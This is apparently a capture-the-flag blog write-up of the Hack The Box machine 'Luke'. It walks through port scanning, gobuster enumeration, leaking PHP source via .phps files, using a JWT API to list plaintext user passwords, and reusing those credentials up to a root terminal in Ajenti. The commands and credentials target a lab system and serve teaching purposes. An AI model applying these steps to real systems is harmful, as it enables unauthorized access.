---
layout: single
title: Luke - Hack The Box
excerpt: "Luke is a easy machine that doesn't have a lot steps but we still learn a few things about REST APIs like how to authenticate to the service and get a JWT token and which headers are required when using that JWT. The rest of the box was pretty straighforward with some gobuster enumeration, finding PHP sources files with credentials then finally getting a shell through the Ajenti application."
date: 2019-09-14
classes: wide
header:
  teaser: /assets/images/htb-writeup-luke/luke_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - ftp
  - php
  - ajenti
  - json
  - jwt
---

![](/assets/images/htb-writeup-luke/luke_logo.png)

Luke is a easy machine that doesn't have a lot steps but we still learn a few things about REST APIs like how to authenticate to the service and get a JWT token and which headers are required when using that JWT. The rest of the box was pretty straighforward with some gobuster enumeration, finding PHP sources files with credentials then finally getting a shell through the Ajenti application.

## Summary

- On the FTP, there's a hint saying we need to get the source file for the web application
- By using the `.phps` file extension we can get the config web application and some credentials
- The credentials are used to authenticate to the API app on port 3000
- With the API we can list the users and their plaintext passwords
- The `/management` URI is protected with basic HTTP auth and we can log in with one of the user found with the API
- We then get the root password from the `config.json` file
- We can then log in as root on the Ajenti admin panel, then spawn a terminal window and retrieve the flags

### Portscan

```
# nmap -p- 10.10.10.137
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-26 16:39 EDT
Nmap scan report for luke.htb (10.10.10.137)
Host is up (0.021s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
8000/tcp open  http-alt
```

### FTP enumeration

Anonymous FTP access is enabled there's a file I can download: `for_Chihiro.txt`

```console
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r-xr-xr-x    1 0        0             306 Apr 14 12:37 for_Chihiro.txt
226 Directory send OK.

ftp> get for_Chihiro.txt
local: for_Chihiro.txt remote: for_Chihiro.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for for_Chihiro.txt (306 bytes).
226 Transfer complete.
306 bytes received in 0.00 secs (809.8323 kB/s)
```

The file contains contains a hint regarding source files for the website application.

```
As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of
the actual website I've created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies !

Derry
```

### Website enumeration

The site running on port 80 is just a generic site with no dynamic content that I can see.

![](/assets/images/htb-writeup-luke/luke1.png)

While running gobuster I find a couple of interesting directories:

```
# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -s 200,204,301,302,307,401,403 -t 25 -x php -u http://10.10.10.137

/LICENSE (Status: 200)
/config.php (Status: 200)
/css (Status: 301)
/js (Status: 301)
/login.php (Status: 200)
/management (Status: 401)
/member (Status: 301)
/vendor (Status: 301)
=====================================================
2019/05/26 16:38:20 Finished
=====================================================
```

`/management` uses HTTP basic authentication and I don't have the password yet. I'll keep that in mind and come back to it later when I find the credentials.

![](/assets/images/htb-writeup-luke/management1.png)

`/login.php` shows a login page for some PHP web application.

![](/assets/images/htb-writeup-luke/login1.png)

I tried a few sets of credentials and I wasn't able to log in. A quick run with SQLmap didn't reveal any easy SQL injection point either.

The hint from the FTP file talked about source files so I did another gobuster pass using `.phps` as the extension since I knew the application was running on PHP based on the `login.php` file found. The `.phps` extension can be used to produce a color formatted output of the PHP source code without actually interpreting it. It's definitely not something you want to leave on your production webservers especially if it contains credentials.

```
# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -s 200,204,301,302,307,401,403 -t 25 -x phps -u http://10.10.10.137
/config.phps (Status: 200)
/login.phps (Status: 200)
```

Allright, I found a couple of files and I see that the `config.phps` contains the root credentials for MySQL

```
$dbHost = 'localhost';
$dbUsername = 'root';
$dbPassword  = 'Zk6heYCyv6ZE9Xcg';
$db = "login";

$conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error);
```

The `login.phps` file shows that the web application is incomplete: it doesn't really do anything when you log in except set the session cookie. This probably means that I was just meant to find the password from the `config.phps` file and that I can ignore the login page.

![](/assets/images/htb-writeup-luke/login_source.png)

### NodeJS app

The application running on port 3000 expects a JWT token in the Authorization header.

![](/assets/images/htb-writeup-luke/json1.png)

I dirbursted the site to find API endpoints and found the following:

```
# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -s 200,204,301,302,307,401,403 -t 25 -u http://10.10.10.137:3000

/Login (Status: 200)
/login (Status: 200)
/users (Status: 200)
=====================================================
2019/05/26 16:41:55 Finished
=====================================================
```

I can't reach `/users` because it expects an authorization header:

```
{"success":false,"message":"Auth token is not supplied"}
```

But I can log in and get a token with the following POST request;

```console
curl -XPOST http://10.10.10.137:3000/login -H 'Content-Type: application/json' -d '{"username":"admin","password":"Zk6heYCyv6ZE9Xcg"}'
```

I get a JWT token back after logging in:

```
{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU4ODg5NzM0LCJleHAiOjE1NTg5NzYxMzR9.hW8fCbdZ2S9L691y_OG5Kr0Bt2598JYjDlqLVrcOlj4"}
```

To authenticate, I add the following header to the GET request on `/` and `/users`:

```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU4ODg5NzM0LCJleHAiOjE1NTg5NzYxMzR9.hW8fCbdZ2S9L691y_OG5Kr0Bt2598JYjDlqLVrcOlj4
```

On `GET /`, I now get `{"message":"Welcome admin ! "}`

`GET /users` shows a list of users:

```
curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTY4NDE3NjA1LCJleHAiOjE1Njg1MDQwMDV9.MXxjA5devINORQHlkRL17JH96uWO1VJIZMKZSDdf--U' http://10.10.10.137:3000/users
[{"ID":"1","name":"Admin","Role":"Superuser"},{"ID":"2","name":"Derry","Role":"Web Admin"},{"ID":"3","name":"Yuri","Role":"Beta Tester"},{"ID":"4","name":"Dory","Role":"Supporter"}]
```

I can query each individual user with `GET /users/<username>` and it returns their password:

```
{"name":"Admin","password":"WX5b7)>/rp$U)FW"}
{"name":"Derry","password":"rZ86wwLvx7jUxtch"}
{"name":"Yuri","password":"bet@tester87"}
{"name":"Dory","password":"5y:!xa=ybfe)/QD"}
```

### Management page

I tried those credentials and found that I can log into the `/management` page with `Derry` (username is case sensitive)

![](/assets/images/htb-writeup-luke/management2.png)

`config.php` and `login.php` contain the source we already have but `config.json` contains another set of credentials:

![](/assets/images/htb-writeup-luke/config.png)

Password: `KpMasng6S5EtTy9Z`

I tried logging in as root by SSH but I wasn't able to.

### Ajenti

I have one port left to check on the system. The Ajenti server admin panel runs on port 8000

![](/assets/images/htb-writeup-luke/ajenti1.png)

I can log in with `root` and `KpMasng6S5EtTy9Z`.

![](/assets/images/htb-writeup-luke/ajenti2.png)

Using the Terminal menu under Tools, I can get a shell and since I'm already running as root I can grab both flags.

![](/assets/images/htb-writeup-luke/flag.png)